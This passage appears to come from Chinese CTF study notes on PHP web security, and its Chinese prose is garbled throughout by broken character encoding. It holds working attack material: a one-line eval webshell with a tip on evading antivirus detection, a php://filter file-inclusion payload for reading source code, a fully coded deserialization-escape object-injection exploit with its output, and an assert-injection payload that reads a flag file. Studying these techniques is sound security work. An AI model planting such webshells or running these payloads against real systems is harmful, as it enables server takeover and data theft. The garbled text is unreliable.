{å®šä¹‰åœ¨å½“å‰é¡µé¢å†…ï¼Œåœ¨å‡½æ•°å¤–ï¼Œéç±»æˆå‘˜} çš„å˜é‡ã€‚å¯¹äºç±»ä¸­çš„æˆå‘˜å˜é‡ï¼Œç±»ä¸­å‡½æ•°å¿…é¡»ä½¿ç”¨$this-&gt;çš„æ–¹å¼è®¿é—®ï¼Œä¸èƒ½ç”¨$GLOBALSæ–¹å¼</p><p>  <img src="/images/%E5%89%8D%E7%AB%AF%E8%87%B3%E5%90%8E%E7%AB%AF%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B.png"></p></li></ul><h2 id="æ­£åˆ™è¡¨è¾¾-regex"><a href="#æ­£åˆ™è¡¨è¾¾-regex" class="headerlink" title="æ­£åˆ™è¡¨è¾¾-regex"></a><big><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md">æ­£åˆ™è¡¨è¾¾-regex</a></big></h2><p>â€‹    <em>åŸºæœ¬çš„æ­£åˆ™è¡¨è¾¾å‚è€ƒé“¾æ¥ï¼Œåœ¨ PHPä¸­å­˜åœ¨éå¸¸è§„çš„æ­£åˆ™è¡¨è¾¾æ ‡è¯†ï¼Œå¦‚ä¸‹è¡¨</em></p><table><thead><tr><th>å­—ç¬¦</th><th>åŒ¹é…é¡¹ç›®</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>åŒ¹é…ä»»ä½•å­—æ¯å’Œæ•°å­—</td></tr><tr><td>[:alpha:]</td><td>åŒ¹é…ä»»ä½•å­—æ¯</td></tr><tr><td>[:blank:]</td><td>åŒ¹é…blank, tabç­‰ç©ºæ ¼ç¬¦</td></tr><tr><td>[:punct:]</td><td>åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å· â€˜! â€œ # $ % &amp; â€˜ ( ) * + , - . / : ; &lt; = &gt; ? @ [ \ ] ^ _ â€˜ { | } ~â€™.</td></tr><tr><td>[:digit:]</td><td>åŒ¹é…ä»»ä½•æ•°å­—</td></tr><tr><td>[:graph:]</td><td>Graphical characters: â€˜[:alnum:]â€™ and â€˜[:punct:]â€™.</td></tr><tr><td>[:lower:]</td><td>åŒ¹é…ä»»ä½•å°å†™å­—æ¯</td></tr><tr><td>[:upper:]</td><td>åŒ¹é…ä»»ä½•å¤§å†™å­—æ¯</td></tr><tr><td>[:print:]</td><td>Printable characters: â€˜[:alnum:]â€™, â€˜[:punct:]â€™, and space.</td></tr></tbody></table><h2 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a><big>ä¸€å¥è¯æœ¨é©¬</big></h2><center><code>&lt;?php @eval($_P0ST['key']) ?&gt;</code></center><p><del>å› ä¸ºç›´æ¥å†™ä¸Šå»ä¼šè¢«æŠ¥æ¯’ï¼Œæ‰‹åŠ¨æŠŠæ•°å­—0æ”¹ä¸ºå­—æ¯Oå°±è¡Œ</del></p><p>åŸç†åœ¨äºï¼šå½“æœ‰å†™å…¥äº†è¿™æ ·ä»£ç çš„æ–‡ä»¶èƒ½å¤Ÿè¢«æœåŠ¡å™¨è§£æï¼Œä¸”è§£ææ–‡ä»¶çš„é¡µé¢å¯ä»¥è®¿é—®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘è¯¥é¡µé¢POSTä¸€ä¸ªkeyï¼Œå…¶å€¼è®¾ä¸ºä»»æ„å¸Œæœ›æœåŠ¡å™¨æ‰§è¡Œçš„PHPä»£ç ç„¶åè¢«evalæ‰§è¡Œï¼›åŸºäºæ­¤ï¼Œèœåˆ€ï¼Œèšå‰‘ç­‰ Webshellå·¥å…·å¯ä»¥è¿æ¥æœåŠ¡å™¨åå°</p><h2 id="swpå¤‡ä»½æ–‡ä»¶"><a href="#swpå¤‡ä»½æ–‡ä»¶" class="headerlink" title=".swpå¤‡ä»½æ–‡ä»¶"></a><big>.swpå¤‡ä»½æ–‡ä»¶</big></h2><p>Linuxä¸­ Vimç¼–è¾‘å™¨äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œç”¨äºå¤‡ä»½è¢«ç¼–è¾‘çš„å†…å®¹ä»¥é˜²éæ­£å¸¸é€€å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -r original_file_name.file_type.swp#ç»ˆç«¯è¾“å…¥æ­¤å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶</span><br><span class="line">:w file_name.file_type#Vimä¸­è¾“å…¥æ­¤å‘½ä»¤å¯ä»¥ä¿å­˜æ–‡ä»¶åˆ°ç»ˆç«¯è¿è¡Œç›®å½•</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a><big>æ–‡ä»¶åŒ…å«æ¼æ´</big></h2><p align="right"><small>ç‰¹å¾ï¼šxxx.php/?file=xxx</small></p><p>include()å‡½æ•°ï¼šæ£€ç´¢æ–‡ä»¶ä¸­çš„phpä»£ç ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œï¼›åä¹‹åˆ™è¾“å‡ºåŸæ–‡ã€‚åŸæœ¬ç”¨äºä¼˜åŒ–ä»£ç çš„é‡ç”¨æ€§ï¼Œä½†å…¶ç‰¹æ€§ä½¿å¾—è¿™ä¸ªå‡½æ•°å°±æ˜¯é€ æˆæ¼æ´çš„æ ¹æœ¬</p><ul><li>phpä¼ªåè®®ï¼ˆå°è£…åè®®ï¼‰ï¼š<ul><li>php://ï¼šå¯ä»¥è®¿é—®å„ç§I/Oæµï¼Œå¦‚php://inputå¸¸ç”¨äºfile_get_contents(php://input)ï¼Œè¿™æ ·å°±å¯ä»¥è¯»å…¥ç”¨æˆ·çš„è¾“å…¥æµã€‚å¦‚æœç›´æ¥ä½¿ç”¨<code>?file=wanted.php</code>ä¼šè¢«è§£æï¼Œä½†æƒ³è¦æŸ¥çœ‹æºç ï¼Œåˆ™å¯ä»¥ç”¨<code>?file=php://filter/convert.base64-encode/resource=wanted.php</code>ï¼Œå¯ä»¥å¾—åˆ°å…¶b64ç¼–ç åçš„æºç ï¼Œè¿™æ ·php://filterå°±ä½œä¸ºä¸­é—´æµï¼ŒæŠŠæºç è½¬b64ï¼Œinclude()æ— æ³•æ‰§è¡Œï¼Œäºæ˜¯ç›´æ¥è¾“å‡ºb64ç¼–ç åçš„æºç </li><li>file://ï¼šå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ï¼Œåæ¥ç›®å½•å³å¯</li><li>è¿˜æœ‰å¦‚zip://ï¼Œdata://ç­‰åè®®ï¼Œä½†ç›®å‰æ²¡æœ‰åšåˆ°æœ‰éœ€è¦çš„é¢˜ç›®</li></ul></li><li>æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«ï¼šå½“ç”¨æˆ·å¯ä»¥ä¸Šä¼ æ–‡ä»¶ä¸”æ–‡ä»¶ç›®å½•å¯çŸ¥ï¼ŒåŒæ—¶è¿˜å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œåˆ™ç”¨æˆ·å¯ä»¥é€šè¿‡ä¸Šä¼ ä»»æ„åŒ…å«äº†ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶æ‰”ç»™include()æ¥è§£æ</li></ul><h2 id="ååºåˆ—åŒ–é€ƒé€¸"><a href="#ååºåˆ—åŒ–é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–é€ƒé€¸"></a><big>ååºåˆ—åŒ–é€ƒé€¸</big></h2><p>ç”¨æˆ·è¾“å…¥è¦ä¼ è¾“åˆ°æœåŠ¡å™¨ï¼Œå¸¸éœ€è¦è¿‡æ»¤ä¸åºåˆ—åŒ–ï¼Œä½†å½“è¿‡æ»¤æ­¥éª¤æ”¾åœ¨åºåˆ—åŒ–ä¹‹åï¼Œåˆ™å¯èƒ½å› ä¸ºå­—ç¬¦ä¸²é€ƒé€¸è€Œé€ æˆå¯¹è±¡æ³¨å…¥</p><ul><li><p>åŸç†ï¼šè¿‡æ»¤å‡½æ•°é€ æˆäº†åºåˆ—åŒ–è¿”å›çš„å­—ç¬¦ä¸²å†…å®¹å‡å°‘æˆ–å¢åŠ çš„ç°è±¡ï¼Œä½†æ²¡æœ‰ä¿®æ”¹æ•°æ®é•¿åº¦çš„æ ‡è®°ï¼ˆå¦‚ â€œphpâ€è¢«æ›¿æ¢ä¸º â€œNONONOâ€ï¼›æˆ– â€œWHEREâ€è¢«æ›¿æ¢ä¸º â€œMARKâ€ï¼‰ï¼Œåˆååºåˆ—åŒ–é€šè¿‡è¯†åˆ« â€œ;}â€œé—­åˆï¼Œåé¢å†—ä½™çš„å†…å®¹ä¼šè¢«ä¸¢å¼ƒ</p></li><li><p>å…·ä½“çš„æ”»å‡»å½¢å¼</p><ul><li><p>åœ¨æ­¤å¯ä»¥å…ˆç¡®è®¤éœ€è¦æ„é€ çš„å¯¹è±¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>,<span class="keyword">new</span> Admin(<span class="string">&#x27;hack&#x27;</span>)));</span><br></pre></td></tr></table></figure></li></ul><blockquote>#[Out] // åŸæœ¬æ— æ¢è¡Œç¬¦ä¸ä»»ä½•ç©ºæ ¼ï¼Œä¸ºäº†å¯è¯»æ€§è€Œæ‰‹åŠ¨æ·»åŠ <br>O:4:"User":2:{<br>&emsp;s:8:"username";s:5:"guest";<br>&emsp;s:6:"passwd";O:5:"Admin":1:{<br>&emsp;&emsp;s:3:"Key";s:4:"hack";<br>&emsp;}<br>}</blockquote>  </li><li><p>ç¡®å®šäº†éœ€è¦æ„é€ çš„å¯¹è±¡å³ä¸ºä¸Šæ–‡ä¸­çš„è¾“å‡º</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ­¤å¤„ç”¨æˆ·åªèƒ½æ§åˆ¶Userç±»ä¸­çš„$usernameä¸$passwd</span></span><br><span class="line"><span class="comment">#å´å¯ä»¥é€šè¿‡é€ƒé€¸ä¿®æ”¹Adminç±»ä¸­çš„$Key</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;Key,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterLess</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;NO&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#å‡å°‘2ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterMore</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;_JESUS_&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#å¢åŠ 3ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC:â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iusername</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$ipasswd</span>=<span class="string">&#x27;guestpass&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$iusername</span>,<span class="variable">$ipasswd</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:6:&quot;passwd&quot;;s:9:&quot;guestpass&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">HACK:</span>â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#è¿™å°±æ˜¯å¸Œæœ›æ³¨å…¥çš„å†…å®¹ï¼Œä¿®æ”¹Adminç±»ä¸­çš„$Keyä¸ºhack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LESS:â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======LESS START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ€æƒ³åœ¨äºï¼šæ ‡è®°é•¿åº¦ä¸å˜çš„æƒ…å†µä¸‹æ•°æ®å‡å°‘äº†</span></span><br><span class="line">    <span class="comment">#ä¹Ÿå°±æ˜¯è¯´ä¼šæœ‰ä¸å‡å°‘é‡ç›¸ç­‰çš„å­—ç¬¦æ•°é‡è¢«åå¹¶ä¸ºå˜é‡çš„value</span></span><br><span class="line">    <span class="variable">$dataEatenByLess</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;s:41:&quot;&#x27;</span>;</span><br><span class="line">    <span class="comment">#å¸Œæœ›è¢«filterLessåƒæ‰çš„å­—ç¬¦ä¸²å¦‚ä¸Š</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$dataEatenByLess</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//21</span></span><br><span class="line">    <span class="comment">#æ¯ä¸ªFLAGå2å­—ç¬¦ï¼Œåœ¨passwdè¡¥ä¸€ä½å‡‘3çš„å€æ•°</span></span><br><span class="line">    <span class="comment">#11ä¸ªFLAGåå®Œï¼Œåå®Œåè¦æ”¹ä»€ä¹ˆå˜é‡å°±éšå¿ƒæ‰€æ¬²äº†</span></span><br><span class="line">    <span class="variable">$payloadPasswd</span>=<span class="string">&#x27;0&#x27;</span>.<span class="variable">$target</span>;</span><br><span class="line">    <span class="variable">$payloadLess</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">11</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$payloadLess</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$payloadLess</span>,<span class="variable">$payloadPasswd</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    unserialize(filterLess(<span class="variable">$data</span>));<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;NONONONONONONONONONONO&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MORE:â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======MORE START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ€æƒ³åœ¨äºï¼šæ ‡è®°é•¿åº¦ä¸å˜çš„æƒ…å†µä¸‹æ•°æ®å¢åŠ äº†</span></span><br><span class="line">    <span class="comment">#è®¡ç®—å¥½éœ€è¦é€ƒé€¸çš„é‡ï¼Œä½¿å…¶åˆšå¥½ä¸å¢åŠ é‡ç›¸ç­‰ï¼Œè¿™äº›å­—ç¬¦å°±è·‘åˆ°å˜é‡çš„valueä¹‹å¤–äº†</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$target</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//53</span></span><br><span class="line">    <span class="comment">#æ¯ä¸ªFLAGæº¢å‡º3ä¸ªå­—ç¬¦ï¼Œéœ€è¦é€ƒé€¸53ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="comment">#åœ¨é€ƒé€¸å­—ç¬¦é—­åˆåé¢åŠ ä¸Šä»»æ„ä¸€ä¸ªå­—ç¬¦å‡‘æˆ3çš„å€æ•°ï¼Œ18ä¸ªFLAGè¾¾åˆ°æº¢å‡ºé‡</span></span><br><span class="line">    <span class="variable">$dataOverflow</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">18</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$dataOverflow</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$dataOverflow</span>.=<span class="variable">$target</span>.<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$dataOverflow</span>,<span class="string">&#x27;anything&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:126:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    unserialize(filterMore(<span class="variable">$data</span>));<span class="comment">//&#123;s:8:&quot;username&quot;;s:126:&quot;_JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS_&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="PHPå¤ªæ€ªäº†"><a href="#PHPå¤ªæ€ªäº†" class="headerlink" title="PHPå¤ªæ€ªäº†"></a>PHPå¤ªæ€ªäº†</h2><h3 id="å˜é‡å¥—å˜é‡"><a href="#å˜é‡å¥—å˜é‡" class="headerlink" title="å˜é‡å¥—å˜é‡"></a>å˜é‡å¥—å˜é‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;<span class="comment">//è¾“å‡º world</span></span><br></pre></td></tr></table></figure><h3 id="å˜é‡å¥—å‡½æ•°"><a href="#å˜é‡å¥—å‡½æ•°" class="headerlink" title="å˜é‡å¥—å‡½æ•°"></a>å˜é‡å¥—å‡½æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showstr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">showstr();</span><br><span class="line"><span class="comment">//æ­£å¸¸çš„è°ƒç”¨æ–¹æ³•</span></span><br><span class="line"><span class="variable">$action</span> = <span class="string">&quot;showstr&quot;</span>;</span><br><span class="line"><span class="variable">$action</span>();<span class="comment">//å®é™…è°ƒç”¨äº†showstr()å‡½æ•°</span></span><br></pre></td></tr></table></figure><hr><h1 id="PHP-func-DICT"><a href="#PHP-func-DICT" class="headerlink" title="PHP func DICT"></a><big><center>PHP <i>func</i> DICT</center></big></h1><p><code>error_reporting(0)</code>    # å…³é—­é”™è¯¯æŠ¥å‘Š</p><p><code>print()</code>/<code>print_r()</code>/<code>echo</code>    # echoæ›´åƒæ˜¯å¦‚ ifï¼Œwhileè¿™æ ·çš„è¯­è¨€ç»“æ„ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œä¸”å¯ä»¥ç›´æ¥æ‰“å°å¤šä¸ªå˜é‡ï¼›print()ä¸ print_r()æ˜¯å‡½æ•°ï¼Œå­˜åœ¨è¿”å›å€¼ trueï¼›å…¶ä¸­ print_r()ç›¸æ¯” print()å¯ä»¥ä¼ å…¥çš„å˜é‡èŒƒå›´æ›´å¤§ï¼Œæ•°ç»„ä¹Ÿå¯ä»¥ç”¨ print_r()æ‰“å°å‡ºæ¥</p><p><code>var_dump($var)</code>    # å±•ç¤º$varçš„valueä¸type</p><p><code>eval($str)</code>    # æ‰§è¡Œå‚æ•°ä¸­åŒ…å«çš„PHPä»£ç </p><p><code>assert($str)</code>    # æ–­è¨€ï¼Œå¯ä»¥çœ‹ä½œå¼‚å¸¸å¤„ç†çš„ä¸€ç§é«˜çº§å½¢å¼ï¼Œç”¨äºè°ƒè¯•ä»£ç ï¼Œé‡ç‚¹åœ¨äºassertå‡½æ•°ä¼šå°†ä¼ å…¥çš„ strç±»å‹å‚æ•°å…¨éƒ¨å½“æˆ PHPä»£ç æ‰§è¡Œï¼Œä¸ evalç±»ä¼¼ã€‚ä½†æ ¹æ®æµ‹è¯•ï¼Œassertçš„ä»£ç ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¹Ÿä¸èƒ½è¾“å…¥å¤šä¸ªè¯­å¥</p><ul><li><p>assertçš„é—­åˆ // ç†è®ºä¸Šå¦‚æ­¤ï¼Œå¾…æµ‹è¯•</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POSTï¼šmyString=&#x27;&#x27;) or print_r(file_get_content(flag.php));#</span></span><br><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">&#x27;myString&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;holyShit&quot;</span>);</span><br><span class="line"><span class="comment">//æœ€ç»ˆä¼šæ‰§è¡Œçš„æ˜¯ï¼š</span></span><br><span class="line">assert(<span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> print_r(file_get_content(flag.php));<span class="comment">#) or 